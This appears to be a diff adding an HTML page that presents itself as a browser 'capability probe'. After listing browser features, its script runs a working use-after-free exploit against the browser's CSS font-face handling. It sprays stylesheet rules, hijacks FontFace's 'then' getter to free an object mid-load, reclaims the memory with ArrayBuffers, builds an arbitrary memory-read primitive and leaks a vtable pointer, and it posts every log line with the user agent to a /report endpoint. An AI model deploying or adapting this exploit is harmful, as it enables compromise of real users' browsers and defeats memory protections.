@@ -1,0 +1,85 @@
+<!doctype html><html><head><meta charset="utf-8"><title>CSF capability probe</title>
+<style>body{margin:0;padding:16px;background:#0b0e14;color:#d7dce5;font-family:system-ui}
+#o{white-space:pre-wrap;font:12px/1.5 ui-monospace,monospace;color:#9fb4d6}</style></head>
+<body><div id="s">CSF PROBE</div><pre id="o"></pre><script>
+var out=document.getElementById("o"),LOG=[];
+function send(){fetch("/report",{method:"POST",headers:{"content-type":"application/json"},body:JSON.stringify({ua:navigator.userAgent,lines:LOG})}).catch(function(){});}
+function log(s){out.textContent+=s+"\n";LOG.push(s);try{send();}catch(e){}}
+var SZ=0xb8, OFF_FS=0x28, OFF_FS_SZ=0x30, OFF_FS_CAP=0x34, OFF_ST=0x7a;
+
+function caps(){
+  var n=navigator, o=[];
+  o.push("usb="+(n.usb?"YES":"no"));
+  o.push("serial="+(n.serial?"YES":"no"));
+  o.push("bluetooth="+(n.bluetooth?"YES":"no"));
+  o.push("hid="+(n.hid?"YES":"no"));
+  o.push("storage="+(n.storage?"YES":"no"));
+  o.push("showOpenFilePicker="+(typeof window.showOpenFilePicker));
+  o.push("showSaveFilePicker="+(typeof window.showSaveFilePicker));
+  o.push("WebAssembly="+(typeof WebAssembly));
+  o.push("SharedArrayBuffer="+(typeof SharedArrayBuffer));
+  o.push("BigInt="+(typeof BigInt));
+  o.push("crypto.subtle="+(n.crypto&&n.crypto.subtle?"YES":"no"));
+  o.push("indexedDB="+(typeof indexedDB));
+  o.push("localStorage="+(typeof localStorage));
+  o.push("Worker="+(typeof Worker));
+  return o;
+}
+async function init_rw(){
+  var SPRAY=0xb0, abs=[], uaf_font=null, uaf_ab=null;
+  var spray_rule="@font-face{font-family:spray;src:local(systemfont);unicode-range:U+0043;}";
+  var uaf_rule="@font-face{font-family:b;src:url(/font/crafted.otf);unicode-range:U+0042;}";
+  var A=new FontFace("a","local(systemfont)",{unicodeRange:"U+0041"});
+  document.fonts.add(A); void A.loaded;
+  var style=document.createElement("style"); document.head.append(style);
+  for(var i=0;i<SPRAY/4;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
+  var uaf_idx=style.sheet.cssRules.length;
+  style.sheet.insertRule(uaf_rule, style.sheet.cssRules.length);
+  for(var i=SPRAY/4;i<SPRAY;i++) style.sheet.insertRule(spray_rule, style.sheet.cssRules.length);
+  void document.body.offsetHeight;
+  var old_then=FontFace.prototype.then;
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,get:function(){
+    if(this!==A) return undefined;
+    style.sheet.deleteRule(uaf_idx); void document.body.offsetHeight;
+    for(var i=style.sheet.cssRules.length-1;i>=0;i--){ if(style.sheet.cssRules[i].cssText.indexOf("spray")!==-1) style.sheet.deleteRule(i); }
+    void document.body.offsetHeight;
+    for(var i=0;i<SPRAY;i++){ var ab=new ArrayBuffer(SZ); var dv=new DataView(ab); dv.setUint32(8,1,true); dv.setUint8(OFF_ST,3); abs.push(ab); }
+    return undefined;}});
+  var fonts=null; try{ fonts=await document.fonts.load("1em a, b","AB"); }catch(e){}
+  Object.defineProperty(FontFace.prototype,"then",{configurable:true,value:old_then});
+  if(!fonts||fonts.length!==2) return null;
+  for(var i=0;i<fonts.length;i++){ if(fonts[i].unicodeRange==="U+0-10FFFF"){ uaf_font=fonts[i]; break; } }
+  for(var i=0;i<abs.length;i++){ var dv=new DataView(abs[i]); if(dv.getUint32(8,true)===2){ uaf_ab=abs[i]; break; } }
+  if(!uaf_font||!uaf_ab) return null;
+  function setPtr(dv,off,lo,hi){ dv.setUint32(off,lo>>>0,true); dv.setUint32(off+4,hi>>>0,true); }
+  function read(lo,hi,size){
+    var ab=new ArrayBuffer(size), u8=new Uint8Array(ab), dv=new DataView(uaf_ab), o=0;
+    while(o<size){
+      setPtr(dv,OFF_FS,(lo+o)>>>0,hi);
+      dv.setInt32(OFF_FS_SZ,1,true);
+      dv.setInt32(OFF_FS_CAP,1,true);
+      var s=uaf_font.featureSettings;
+      for(var i=1;i<5 && o<size;i++) u8[o++]=s.charCodeAt(i)&0xff;
+    }
+    return ab;
+  }
+  return {font:uaf_font, ab:uaf_ab, read:read};
+}
+(async function(){
+  log("UA: "+navigator.userAgent);
+  log("caps: "+caps().join("  "));
+  var r=await init_rw();
+  if(!r){ log("UAF: no primitive"); log("done"); return; }
+  log("UAF: primitive ok");
+  var dv=new DataView(r.ab);
+  var wrap={lo:dv.getUint32(0x60,true),hi:dv.getUint32(0x64,true)};
+  log("m_wrapper="+("0x"+("00000000"+wrap.hi.toString(16)).slice(-8)+("00000000"+wrap.lo.toString(16)).slice(-8)));
+  var w=new Uint8Array(r.read(wrap.lo,wrap.hi,32));
+  var target={lo:(w[8]|w[9]<<8|w[10]<<16|w[11]<<24)>>>0, hi:(w[12]|w[13]<<8|w[14]<<16|w[15]<<24)>>>0};
+  log("WeakPtr target=0x"+("00000000"+target.hi.toString(16)).slice(-8)+("00000000"+target.lo.toString(16)).slice(-8));
+  var vv=new Uint8Array(r.read(target.lo,target.hi,16));
+  var vp={lo:(vv[0]|vv[1]<<8|vv[2]<<16|vv[3]<<24)>>>0,hi:(vv[4]|vv[5]<<8|vv[6]<<16|vv[7]<<24)>>>0};
+  log("FontFace vptr=0x"+("00000000"+vp.hi.toString(16)).slice(-8)+("00000000"+vp.lo.toString(16)).slice(-8)+"  <== MODULE LEAK");
+  log("done");
+})();
+</script></body></html>
